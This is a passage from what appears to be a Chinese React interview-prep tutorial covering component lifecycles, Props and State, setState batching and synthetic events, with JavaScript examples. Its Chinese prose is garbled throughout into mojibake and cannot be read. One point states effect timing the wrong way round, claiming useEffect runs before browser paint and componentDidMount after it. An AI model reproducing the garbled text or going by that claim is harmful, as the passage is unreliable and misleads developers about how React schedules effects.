align="left">setState åˆå¹¶æ›´æ–°</td></tr></tbody></table><p><strong>ç”Ÿå‘½å‘¨æœŸæ˜ å°„å…³ç³»</strong></p><pre class="mermaid">graph TD  A[ç±»ç»„ä»¶ç”Ÿå‘½å‘¨æœŸ] --> B[componentDidMount]  A --> C[componentDidUpdate]  A --> D[componentWillUnmount]    E[å‡½æ•°ç»„ä»¶ç­‰æ•ˆå®ç°] --> F["useEffect(() => {}, [])"]  E --> G["useEffect(() => {}, [deps])"]  E --> H["useEffect(() => { return () => {} }, [])"]    B -->|æŒ‚è½½åæ‰§è¡Œ| F  C -->|ä¾èµ–æ›´æ–°åæ‰§è¡Œ| G  D -->|å¸è½½å‰æ¸…ç†| H</pre><p>å…³é”®å·®å¼‚ç‚¹ï¼š</p><ul><li>ç±»ç»„ä»¶ï¼šç”Ÿå‘½å‘¨æœŸæ–¹æ³•åˆ†æ•£å®šä¹‰ï¼Œé€»è¾‘æ˜“å‰²è£‚ï¼ŒcomponentDidMount&#x2F;Update åœ¨ æµè§ˆå™¨ç»˜åˆ¶å æ‰§è¡Œ</li><li>å‡½æ•°ç»„ä»¶ï¼šuseEffect é›†ä¸­å¤„ç†å‰¯ä½œç”¨ï¼Œé€šè¿‡ä¾èµ–æ•°ç»„æ§åˆ¶æ‰§è¡Œæ—¶æœºï¼ŒuseEffect åœ¨ æµè§ˆå™¨ç»˜åˆ¶å‰ å¼‚æ­¥æ‰§è¡Œï¼ˆä½¿ç”¨ useLayoutEffect å¯æ¨¡æ‹ŸåŒæ­¥è¡Œä¸ºï¼‰</li></ul><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æŠ€å·§-1"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æŠ€å·§-1" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æŠ€å·§"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æŠ€å·§</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆå‡½æ•°ç»„ä»¶å–ä»£äº†ç±»ç»„ä»¶æˆä¸ºä¸»æµï¼Ÿ</strong></p><ul><li>ä»£ç ç®€æ´æ€§ï¼šå‡å°‘çº¦ 30% ä»£ç é‡ï¼ˆæ—  class&#x2F;this&#x2F;constructorï¼‰</li><li>é€»è¾‘å¤ç”¨ä¼˜åŠ¿ï¼šè‡ªå®šä¹‰ Hook æ¯” HOC&#x2F;Render Props æ›´ç›´è§‚</li><li>æ€§èƒ½ä¼˜åŒ–ï¼šé¿å…ç±»ç»„ä»¶å®ä¾‹åŒ–å¼€é”€ï¼ŒHook ä¾èµ–æ•°ç»„ç²¾å‡†æ§åˆ¶æ›´æ–°</li><li>æœªæ¥å…¼å®¹ï¼šReact æ–°ç‰¹æ€§ï¼ˆConcurrent Featuresï¼‰ä¼˜å…ˆæ”¯æŒå‡½æ•°ç»„ä»¶</li></ul><p><strong>Qï¼šå‡½æ•°ç»„ä»¶å¦‚ä½•å®ç°ç±»ä¼¼ forceUpdate çš„åŠŸèƒ½ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> [_, forceUpdate] = <span class="hljs-title function_">useReducer</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// è°ƒç”¨ forceUpdate() è§¦å‘é‡æ¸²æŸ“</span><br></code></pre></td></tr></table></figure><p>åŸç†ï¼šé€šè¿‡ä¿®æ”¹æ— å…³çŠ¶æ€å¼ºåˆ¶è§¦å‘æ›´æ–°</p><p><strong>Qï¼šç±»ç»„ä»¶ä¸­ setState æ˜¯åŒæ­¥è¿˜æ˜¯å¼‚æ­¥ï¼Ÿ</strong></p><ul><li>React 17 åŠä¹‹å‰ï¼šåˆæˆäº‹ä»¶&#x2F;ç”Ÿå‘½å‘¨æœŸä¸­å¼‚æ­¥ï¼ŒsetTimeout ä¸­åŒæ­¥</li><li>React 18+ï¼šé»˜è®¤å…¨éƒ¨å¼‚æ­¥ï¼ˆè‡ªåŠ¨æ‰¹å¤„ç†ï¼‰</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·å–æ›´æ–°åçŠ¶æ€çš„æ­£ç¡®æ–¹å¼</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-number">42</span> &#125;, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æ›´æ–°åï¼š&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span>); <span class="hljs-comment">// å›è°ƒå‡½æ•°ä¿è¯</span><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="1-4-Props-ä¸-Stateï¼ˆæ•°æ®æµã€å•å‘æ•°æ®ç»‘å®šï¼‰"><a href="#1-4-Props-ä¸-Stateï¼ˆæ•°æ®æµã€å•å‘æ•°æ®ç»‘å®šï¼‰" class="headerlink" title="1.4 Props ä¸ Stateï¼ˆæ•°æ®æµã€å•å‘æ•°æ®ç»‘å®šï¼‰"></a>1.4 Props ä¸ Stateï¼ˆæ•°æ®æµã€å•å‘æ•°æ®ç»‘å®šï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µå¯¹æ¯”è¡¨"><a href="#åŸºç¡€æ¦‚å¿µå¯¹æ¯”è¡¨" class="headerlink" title="åŸºç¡€æ¦‚å¿µå¯¹æ¯”è¡¨"></a>åŸºç¡€æ¦‚å¿µå¯¹æ¯”è¡¨</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Props</th><th align="left">State</th></tr></thead><tbody><tr><td align="left">å®šä¹‰</td><td align="left">ç»„ä»¶å¤–éƒ¨ä¼ å…¥çš„æ•°æ®</td><td align="left">ç»„ä»¶å†…éƒ¨ç®¡ç†çš„çŠ¶æ€</td></tr><tr><td align="left">å¯å˜æ€§</td><td align="left">åªè¯»ï¼ˆImmutableï¼‰</td><td align="left">å¯ä¿®æ”¹ï¼ˆé€šè¿‡ setState&#x2F;useStateï¼‰</td></tr><tr><td align="left">æ•°æ®æº</td><td align="left">çˆ¶ç»„ä»¶ä¼ é€’</td><td align="left">ç»„ä»¶è‡ªèº«åˆ›å»º</td></tr><tr><td align="left">æ›´æ–°è§¦å‘</td><td align="left">çˆ¶ç»„ä»¶é‡æ¸²æŸ“</td><td align="left">è°ƒç”¨çŠ¶æ€æ›´æ–°å‡½æ•°</td></tr><tr><td align="left">é€šä¿¡æ–¹å‘</td><td align="left">çˆ¶ â†’ å­</td><td align="left">ç»„ä»¶å†…éƒ¨</td></tr></tbody></table><h3 id="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ"><a href="#æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ" class="headerlink" title="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ"></a>æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ</h3><p><strong>å•å‘æ•°æ®æµï¼ˆUnidirectional Data Flowï¼‰</strong></p><pre class="mermaid">graph LRA[çˆ¶ç»„ä»¶] -- Props --> B[å­ç»„ä»¶1]A -- Props --> C[å­ç»„ä»¶2]B -- Props --> D[å­™å­ç»„ä»¶]C -- Props --> E[å­™å­ç»„ä»¶]</pre><p>æ ¸å¿ƒè§„åˆ™ï¼š</p><ul><li>æ•°æ®åªèƒ½ä»çˆ¶ç»„ä»¶æµå‘å­ç»„ä»¶ï¼Œç¦æ­¢åå‘æµåŠ¨</li><li>å­ç»„ä»¶ä¿®æ”¹çˆ¶ç»„ä»¶æ•°æ®éœ€é€šè¿‡å›è°ƒå‡½æ•°å®ç°ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// çˆ¶ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setValue&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// å­ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">&#123; value, onChange &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> onChange(e.target.value)&#125; /&gt;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Props çš„ä¸å¯å˜æ€§ï¼ˆImmutabilityï¼‰</strong></p><p>åº•å±‚åŸç†ï¼š</p><ul><li>React ä½¿ç”¨ Object.is ç®—æ³•è¿›è¡Œ props æµ…æ¯”è¾ƒï¼ˆshallow compareï¼‰</li><li>è‹¥æ£€æµ‹åˆ° props å¼•ç”¨å˜åŒ–ï¼Œåˆ™è§¦å‘å­ç»„ä»¶é‡æ¸²æŸ“</li></ul><p>å¼€å‘çº¦æŸï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç¦æ­¢ç›´æ¥ä¿®æ”¹ props</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserCard</span>(<span class="hljs-params">&#123; user &#125;</span>) &#123;<br>  user.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Hacked&quot;</span>;  <span class="hljs-comment">// è¿åä¸å¯å˜æ€§åŸåˆ™</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// æ­£ç¡®åšæ³•ï¼šä½¿ç”¨æ´¾ç”Ÿæ•°æ®</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserCard</span>(<span class="hljs-params">&#123; user &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> displayName = user.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>();  <span class="hljs-comment">// åˆ›å»ºæ–°å€¼</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;displayName&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>State æ›´æ–°æœºåˆ¶</strong></p><p>(1) ç±»ç»„ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> &#125;;<br>  <br>  increment = <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// æ‰¹é‡æ›´æ–°ï¼šå¤šæ¬¡ setState åˆå¹¶ä¸ºä¸€æ¬¡æ›´æ–°</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;);<br>    <span class="hljs-comment">// ç»“æœï¼šcount åª +1ï¼ˆä½¿ç”¨å¯¹è±¡å½¢å¼ï¼‰</span><br>    <br>    <span class="hljs-comment">// å‡½æ•°å½¢å¼è§£å†³è¿ç»­æ›´æ–°</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; <span class="hljs-attr">count</span>: prev.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;));<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; <span class="hljs-attr">count</span>: prev.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;));<br>    <span class="hljs-comment">// ç»“æœï¼šcount +2</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å‡½æ•°ç»„ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);  <span class="hljs-comment">// é—­åŒ…æ•è·å½“å‰ count å€¼</span><br>    <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);  <span class="hljs-comment">// ä»åŸºäºåˆå§‹å€¼è®¡ç®—</span><br>    <br>    <span class="hljs-comment">// å‡½æ•°å½¢å¼è·å–æœ€æ–°å€¼</span><br>    <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br>    <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>); <span class="hljs-comment">// æ­£ç¡® +2</span><br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆReactå¼ºè°ƒPropsä¸å¯å˜ï¼Ÿ</strong></p><ul><li>å¯é¢„æµ‹æ€§ï¼šç¡®ä¿ç»„ä»¶è¡Œä¸ºåªå–å†³äºè¾“å…¥çš„propsï¼Œä¾¿äºè°ƒè¯•</li><li>æ€§èƒ½ä¼˜åŒ–ï¼šæµ…æ¯”è¾ƒä¾èµ–å¼•ç”¨ä¸å˜æ€§ï¼ˆè‹¥ç›´æ¥ä¿®æ”¹ï¼Œæµ…æ¯”è¾ƒæ— æ³•æ£€æµ‹å˜åŒ–ï¼‰</li><li>å¹¶å‘å®‰å…¨ï¼šé¿å…æ•°æ®åœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­è¢«æ„å¤–ä¿®æ”¹</li></ul><p><strong>Qï¼šå¦‚ä½•å®ç°å­ç»„ä»¶å‘çˆ¶ç»„ä»¶é€šä¿¡ï¼Ÿ</strong></p><p>è®¾è®¡æ¨¡å¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// çˆ¶ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-comment">// å›è°ƒå‡½æ•°ä½œä¸ºpropä¼ é€’</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChildSubmit</span> = (<span class="hljs-params">childData</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setData</span>(childData);<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;handleChildSubmit&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// å­ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">&#123; onSubmit &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [input, setInput] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;input&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> setInput(e.target.value)&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> onSubmit(input)&#125;&gt;æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šä»€ä¹ˆæ—¶å€™è¯¥ç”¨Props vs Stateï¼Ÿ</strong></p><p>å†³ç­–è¿‡ç¨‹ï¼š</p><pre class="mermaid">graph TDA[æ•°æ®æ¥æº] -->|çˆ¶ç»„ä»¶ä¼ é€’| B[ç”¨Props]A -->|ç»„ä»¶è‡ªèº«ç®¡ç†| C[ç”¨State]D[æ˜¯å¦éšæ—¶é—´/äº¤äº’å˜åŒ–] -->|å¦| E[ç”¨Props]D -->|æ˜¯| F[ç”¨State]</pre><h3 id="é«˜çº§åº”ç”¨åœºæ™¯"><a href="#é«˜çº§åº”ç”¨åœºæ™¯" class="headerlink" title="é«˜çº§åº”ç”¨åœºæ™¯"></a>é«˜çº§åº”ç”¨åœºæ™¯</h3><p><strong>çŠ¶æ€æå‡ï¼ˆLifting State Upï¼‰</strong></p><p>åœºæ™¯ï¼šå¤šä¸ªç»„ä»¶éœ€è¦å…±äº«åŒä¸€çŠ¶æ€</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// çŠ¶æ€æå‡åˆ°å…±åŒçˆ¶ç»„ä»¶</span><br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Toolbar</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> <span class="hljs-attr">onThemeChange</span>=<span class="hljs-string">&#123;setTheme&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ContentArea</span> <span class="hljs-attr">theme</span>=<span class="hljs-string">&#123;theme&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// å­ç»„ä»¶é€šè¿‡propsè·å–/æ›´æ–°çŠ¶æ€</span><br></code></pre></td></tr></table></figure><h3 id="æ€§èƒ½ä¼˜åŒ–é™·é˜±"><a href="#æ€§èƒ½ä¼˜åŒ–é™·é˜±" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–é™·é˜±"></a>æ€§èƒ½ä¼˜åŒ–é™·é˜±</h3><p><strong>Props ç©¿é€é—®é¢˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ ä¸å¿…è¦é‡æ¸²æŸ“ï¼šç›´æ¥ä¼ é€’å¯¹è±¡</span><br>&lt;<span class="hljs-title class_">Child</span> user=&#123;user&#125; /&gt;<br><br><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šæ‰å¹³åŒ–propsæˆ–React.memo</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#123;user.name&#125;</span> <span class="hljs-attr">age</span>=<span class="hljs-string">&#123;user.age&#125;</span> /&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€ä½ç½®é”™è¯¯å¯¼è‡´çš„æ¸²æŸ“é£æš´</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ çŠ¶æ€æ”¾åœ¨è¿‡é«˜å±‚çº§</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [counter, setCounter] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// ä»»ä½•æ›´æ–°è§¦å‘å…¨åº”ç”¨é‡æ¸²æŸ“</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Page</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// âœ… çŠ¶æ€ä¸‹æ²‰åˆ°æœ€å°èŒƒå›´</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// å½±å“èŒƒå›´å±€éƒ¨åŒ–</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(c+1)&#125;&gt;&#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-5-äº‹ä»¶å¤„ç†ï¼ˆåˆæˆäº‹ä»¶ã€this-ç»‘å®šé—®é¢˜ï¼‰"><a href="#1-5-äº‹ä»¶å¤„ç†ï¼ˆåˆæˆäº‹ä»¶ã€this-ç»‘å®šé—®é¢˜ï¼‰" class="headerlink" title="1.5 äº‹ä»¶å¤„ç†ï¼ˆåˆæˆäº‹ä»¶ã€this ç»‘å®šé—®é¢˜ï¼‰"></a>1.5 äº‹ä»¶å¤„ç†ï¼ˆåˆæˆäº‹ä»¶ã€this ç»‘å®šé—®é¢˜ï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µæ¦‚è¿°-2"><a href="#åŸºç¡€æ¦‚å¿µæ¦‚è¿°-2" class="headerlink" title="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"></a>åŸºç¡€æ¦‚å¿µæ¦‚è¿°</h3><p>React äº‹ä»¶å¤„ç†ç‰¹ç‚¹ï¼š</p><ul><li>é©¼å³°å‘½åï¼šonClick è€Œé onclick</li><li>JSX ä¸­ä¼ å…¥å‡½æ•°å¼•ç”¨è€Œéå­—ç¬¦ä¸²</li><li>é»˜è®¤é˜»æ­¢é»˜è®¤è¡Œä¸ºéœ€æ˜¾å¼è°ƒç”¨ e.preventDefault()</li></ul><p>ä¸¤å¤§æ ¸å¿ƒé—®é¢˜ï¼š</p><ul><li>åˆæˆäº‹ä»¶ï¼ˆSyntheticEventï¼‰æœºåˆ¶</li><li>ç±»ç»„ä»¶ä¸­çš„ this ç»‘å®šé—®é¢˜</li></ul><h3 id="åˆæˆäº‹ä»¶ï¼ˆSyntheticEventï¼‰æ·±åº¦è§£æ"><a href="#åˆæˆäº‹ä»¶ï¼ˆSyntheticEventï¼‰æ·±åº¦è§£æ" class="headerlink" title="åˆæˆäº‹ä»¶ï¼ˆSyntheticEventï¼‰æ·±åº¦è§£æ"></a>åˆæˆäº‹ä»¶ï¼ˆSyntheticEventï¼‰æ·±åº¦è§£æ</h3><p><strong>è®¾è®¡ç›®çš„ä¸åŸç†</strong></p><pre class="mermaid">graph LRA[æµè§ˆå™¨åŸç”Ÿäº‹ä»¶] --> B(Reactäº‹ä»¶ç³»ç»Ÿ)B --> C[åˆ›å»ºåˆæˆäº‹ä»¶å¯¹è±¡]C --> D[äº‹ä»¶å§”æ‰˜åˆ°æ ¹å®¹å™¨]D --> E[è§¦å‘å¯¹åº”ç»„ä»¶å¤„ç†å‡½æ•°]E --> F[äº‹ä»¶æ± å›æ”¶]</pre><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ul><li>è·¨æµè§ˆå™¨å…¼å®¹ï¼šç»Ÿä¸€ä¸åŒæµè§ˆå™¨äº‹ä»¶æ¥å£</li><li>æ€§èƒ½ä¼˜åŒ–ï¼šäº‹ä»¶å§”æ‰˜ + äº‹ä»¶æ± å¤ç”¨ï¼ˆReact 17 å‰ï¼‰</li><li>å†’æ³¡æœºåˆ¶ï¼šåŸºäºè™šæ‹ŸDOMæ ‘è€Œéå®é™…DOMæ ‘</li></ul><p><strong>äº‹ä»¶æ± æœºåˆ¶ï¼ˆReact 17 å‰ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleClick</span>(<span class="hljs-params">e</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>); <span class="hljs-comment">// æ­£å¸¸è®¿é—®</span><br>  <br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>); <span class="hljs-comment">// âŒ React 